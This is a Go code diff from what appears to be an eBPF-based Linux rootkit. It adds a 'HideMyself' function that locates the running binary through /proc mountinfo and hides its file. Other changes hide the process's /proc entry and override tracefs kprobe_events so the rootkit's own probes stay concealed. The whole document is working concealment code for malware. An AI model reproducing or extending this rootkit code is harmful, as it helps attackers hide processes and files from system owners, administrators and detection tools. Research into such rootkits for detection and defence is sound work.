@@ -10,11 +10,24 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
+
+	"github.com/moby/sys/mountinfo"
 
 	"github.com/DataDog/ebpf"
 	"github.com/DataDog/ebpf/manager"
 )
+
+func (rk *RkHidden) ParseMountInfo(pid int32) ([]*mountinfo.Info, error) {
+	f, err := os.Open(fmt.Sprintf("/proc/%d/mountinfo", pid))
+	if err != nil {
+		return nil, err
+	}
+	defer f.Close()
+
+	return mountinfo.GetMountsFromReader(f, nil)
+}
 
 func (rk *RkHidden) GetRkFdKeys(path string) []RkFdKey {
 	matches, err := filepath.Glob("/proc/*/fd/*")
@@ -49,6 +62,8 @@ func (rk *RkHidden) GetRkFdKeys(path string) []RkFdKey {
 }
 
 type RkHidden struct {
+	Pid int
+
 	Options         manager.Options
 	MainManager     *manager.Manager
 	OverrideManager *manager.Manager
@@ -208,6 +223,34 @@ func (rk *RkHidden) HideFile(fsType string, dir string, file string) {
 	rk.OverrideReturn(fsType, path.Join(dir, file), -2)
 }
 
+func (rk *RkHidden) HideMyself() {
+	fi, err := os.Stat(fmt.Sprintf("/proc/%d/exe", rk.Pid))
+	if err != nil {
+		rk.HandleError(err)
+		return
+	}
+
+	stat, ok := fi.Sys().(*syscall.Stat_t)
+	if !ok {
+		return
+	}
+
+	infos, err := rk.ParseMountInfo(int32(rk.Pid))
+	if err != nil {
+		rk.HandleError(err)
+		return
+	}
+
+	for _, info := range infos {
+		if uint64(info.Minor) == stat.Dev {
+			exe, _ := os.Executable()
+			dir, file := path.Split(strings.TrimPrefix(exe, info.Mountpoint))
+
+			rk.HideFile(info.FSType, dir, file)
+		}
+	}
+}
+
 func (rk *RkHidden) InitOverride() {
 	rkFilesMap, _, _ := rk.MainManager.GetMap("rk_files")
 	rkFdAttrsMap, _, _ := rk.MainManager.GetMap("rk_fd_attrs")
@@ -241,7 +284,7 @@ func (rk *RkHidden) InitOverride() {
 		rk.HandleError(err)
 	}
 
-	// Start the override manager
+	// start the override manager
 	if err := rk.OverrideManager.Start(); err != nil {
 		rk.HandleError(err)
 	}
@@ -282,10 +325,13 @@ func (rk *RkHidden) InitOverride() {
 	rk.OverrideContent("tracefs", "kprobe_events", bytes.NewReader(rk.KprobeEvents))
 
 	// proc override
-	rk.HideFile("proc", "", strconv.Itoa(os.Getpid()))
+	rk.HideFile("proc", "", strconv.Itoa(rk.Pid))
+
+	// hide the binary itself
+	rk.HideMyself()
 
 	// example
-	rk.HideFile("ext4", "etc", "issue")
+	//rk.HideFile("ext4", "etc", "issue")
 }
 
 func (rk *RkHidden) Start() {
@@ -296,7 +342,7 @@ func (rk *RkHidden) Start() {
 		ConstantEditors: []manager.ConstantEditor{
 			{
 				Name:  "rk_pid",
-				Value: uint64(os.Getpid()),
+				Value: uint64(rk.Pid),
 			},
 		},
 	}
@@ -308,12 +354,12 @@ func (rk *RkHidden) Start() {
 		rk.KprobeEvents, _ = ioutil.ReadAll(file)
 	}
 
-	// Initialize the main manager
+	// initialize the main manager
 	if err := rk.MainManager.InitWithOptions(mainAsset(), rk.Options); err != nil {
 		HandleError(err)
 	}
 
-	// Start the manager
+	// start the manager
 	if err := rk.MainManager.Start(); err != nil {
 		HandleError(err)
 	}
@@ -327,7 +373,7 @@ func (rk *RkHidden) Start() {
 	// unblock kmsg
 	rk.UnBlockKsmg(rkFdKeys)
 
-	fmt.Printf("Started: %d\n", os.Getpid())
+	fmt.Printf("Started: %d\n", rk.Pid)
 }
 
 func (rk *RkHidden) Stop() {
@@ -342,6 +388,7 @@ func (rk *RkHidden) Stop() {
 
 func NewRkHidden() *RkHidden {
 	return &RkHidden{
+		Pid:             os.Getpid(),
 		MainManager:     &manager.Manager{Probes: MainProbes},
 		OverrideManager: &manager.Manager{Probes: OverrideProbes},
 		HandleError:     HandleError,
